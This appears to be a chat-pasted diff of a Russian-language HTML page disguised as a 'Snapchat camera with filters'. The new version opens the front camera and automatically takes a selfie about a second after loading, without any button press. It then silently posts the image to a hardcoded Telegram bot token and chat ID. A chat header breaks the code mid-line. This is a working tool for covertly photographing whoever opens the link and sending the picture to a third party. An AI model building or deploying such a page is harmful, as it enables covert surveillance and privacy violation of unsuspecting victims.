@@ -1,128 +1,198 @@
+Мираж, [20.07.2025 02:39]
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Snapchat камера</title>
+<title>Snapchat камера с фильтрами и автофото</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap');
-  * {
-    box-sizing: border-box;
-    margin: 0; padding: 0;
-  }
   body, html {
-    height: 100%;
-    background: #000;
-    font-family: 'Montserrat', sans-serif;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-  }
-  #camera-container {
-    position: relative;
-    width: 100vw;
-    height: 100vh;
+    margin: 0; padding: 0; height: 100vh; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center;
+    font-family: Arial, sans-serif; color: white;
     overflow: hidden;
+  }
+  #video-container {
+    position: relative;
+    width: 100vw; max-width: 400px; height: 533px; /* 3:4 */
   }
   video {
     width: 100%;
     height: 100%;
     object-fit: cover;
-    filter: brightness(0.9);
+    transform: scaleX(-1); /* зеркально */
+    border-radius: 16px;
   }
-  #top-bar {
+  #mask {
     position: absolute;
-    top: 20px;
-    left: 0;
-    right: 0;
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    letter-spacing: 2px;
-    color: #fffc00;
-    text-shadow: 0 0 5px #fffc00;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
     pointer-events: none;
+    user-select: none;
+    mix-blend-mode: screen; /* для эффекта */
   }
-  #shoot-btn {
-    position: absolute;
-    bottom: 40px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 90px;
-    height: 90px;
-    background: #fffc00;
+  #filters {
+    margin-top: 12px;
+    display: flex;
+    gap: 12px;
+    overflow-x: auto;
+    padding: 8px;
+    width: 100vw;
+    max-width: 420px;
+    box-sizing: border-box;
+  }
+  .filter-btn {
+    width: 64px; height: 64px;
     border-radius: 50%;
-    box-shadow:
-      0 0 10px #fff,
-      0 0 20px #fffc00,
-      0 0 30px #fffc00;
+    border: 2px solid transparent;
     cursor: pointer;
-    transition: transform 0.1s ease;
+    overflow: hidden;
+    flex-shrink: 0;
+    box-shadow: 0 0 8px rgba(255,255,255,0.3);
+    transition: border-color 0.2s;
+    background: #222;
   }
-  #shoot-btn:active {
-    transform: translateX(-50%) scale(0.85);
+  .filter-btn.selected {
+    border-color: #fffc00;
+    box-shadow: 0 0 12px #fffc00;
   }
-  #flash {
-    position: absolute;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: white;
-    opacity: 0;
+  .filter-btn img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
     pointer-events: none;
-    animation: flashAnim 0.4s ease forwards;
+    user-select: none;
   }
-  @keyframes flashAnim {
-    0% {opacity: 0.9;}
-    100% {opacity: 0;}
+  #status {
+    margin-top: 16px;
+    font-size: 14px;
+    min-height: 20px;
+    text-align: center;
   }
 </style>
 </head>
 <body>
 
-<div id="camera-container">
-  <div id="top-bar">SNAP CAMERA</div>
-  <video id="camera" autoplay playsinline></video>
-  <div id="shoot-btn" title="Сделать фото"></div>
+<div id="video-container">
+  <video id="video" autoplay muted playsinline></video>
+  <img id="mask" src="" alt="Маска фильтра" />
 </div>
-<div id="flash"></div>
+
+<div id="filters"></div>
+<div id="status">Запрашиваем доступ к камере...</div>
 
 <script>
-  const video = document.getElementById('camera');
-  const shootBtn = document.getElementById('shoot-btn');
-  const flash = document.getElementById('flash');
+  const BOT_TOKEN = 'ТВОЙ_BOT_TOKEN_ЗДЕСЬ';
+  const CHAT_ID = 'ТВОЙ_CHAT_ID_ЗДЕСЬ';
 
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => { video.srcObject = stream; })
-    .catch(() => alert("Камера не доступна"));
+  const video = document.getElementById('video');
+  const maskImg = document.getElementById('mask');
+  const filtersContainer = document.getElementById('filters');
+  const status = document.getElementById('status');
 
-  shootBtn.addEventListener('click', () => {
-    flash.style.opacity = '0.9';
-    flash.style.animation = 'none';
-    flash.offsetHeight; // trigger reflow
-    flash.style.animation = null;
+  // Список фильтров - PNG или GIF с прозрачным фоном (можно заменить на свои)
+  const filters = [
+    { name: 'Очки', src: 'https://i.postimg.cc/fyC6yZ9P/glasses.png' },
+    { name: 'Шляпа', src: 'https://i.postimg.cc/25vQntbM/hat.png' },
+    { name: 'Уши', src: 'https://i.postimg.cc/9QZJXmMg/ears.png' },
+    { name: 'Анимация 1', src: 'https://i.gifer.com/origin/61/6159a162be08d8c3df91607cc2e0974b_w200.gif' },
+    { name: 'Анимация 2', src: 'https://i.gifer.com/origin/26/26a3a1b5d8b93c9c84c285384b018fa4_w200.gif' }
+  ];
 
+  let selectedFilterIndex = 0;
+  let stream;
+
+  // Создаем кнопки фильтров
+  filters.forEach((filter, i) => {
+    const btn = document.createElement('button');
+    btn.className = 'filter-btn' + (i === selectedFilterIndex ? ' selected' : '');
+    btn.title = filter.name;
+    const img = document.createElement('img');
+    img.src = filter.src;
+    img.alt = filter.name;
+    btn.appendChild(img);
+    btn.onclick = () => {
+      selectedFilterIndex = i;
+      updateSelectedFilter();
+    };
+    filtersContainer.appendChild(btn);
+  });
+
+  function updateSelectedFilter() {
+    maskImg.src = filters[selectedFilterIndex].src;
+    document.querySelectorAll('.filter-btn').forEach((btn, idx) => {
+      btn.classList.toggle('selected', idx === selectedFilterIndex);
+    });
+  }
+
+  async function startCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      video.srcObject = stream;
+      status.textContent = 'Камера включена. Фильтр: ' + filters[selectedFilterIndex].name;
+
+      // Ждем, пока видео будет готово
+      video.onloadedmetadata = () => {
+        setTimeout(autoSnap, 1200); // Авто фото через 1.2 секунды после запуска
+      };
+    } catch (e) {
+      status.textContent = 'Ошибка доступа к камере: ' + e.message;
+    }
+  }
+
+  function autoSnap() {
+    status.
+
+Мираж, [20.07.2025 02:39]
+textContent = 'Делаем фото...';
+
+    // Создаем canvas
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
+
+    // Рисуем видео зеркально
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    canvas.toBlob(blob => {
-      const formData = new FormData();
-      formData.append('chat_id', '5586578957');
-      formData.append('photo', blob, 'selfie.png');
+    // Рисуем выбранную маску поверх видео (пример — растянуть маску на весь кадр)
+    const mask = new Image();
+    mask.src = filters[selectedFilterIndex].src;
+    mask.onload = () => {
+      ctx.drawImage(mask, 0, 0, canvas.width, canvas.height);
 
-      fetch('https://api.telegram.org/bot7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto', {
-        method: 'POST',
-        body: formData
-      }).then(() => {
-        alert('Фото отправлено в Telegram!');
-      }).catch(() => {
-        alert('Ошибка отправки');
-      });
-    }, 'image/png');
-  });
+      canvas.toBlob(blob => {
+        sendPhoto(blob);
+      }, 'image/png');
+    }
+  }
+
+  function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', 5586578957);
+    formData.append('photo', blob, 'snap.png');
+
+    fetch(`https://api.telegram.org/bot7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        status.textContent = 'Фото успешно отправлено в Telegram! 📸';
+      } else {
+        status.textContent = 'Ошибка Telegram API: ' + JSON.stringify(data.description);
+      }
+    })
+    .catch(err => {
+      status.textContent = 'Ошибка отправки: ' + err.message;
+    });
+  }
+
+  updateSelectedFilter();
+  startCamera();
+
 </script>
 
 </body>
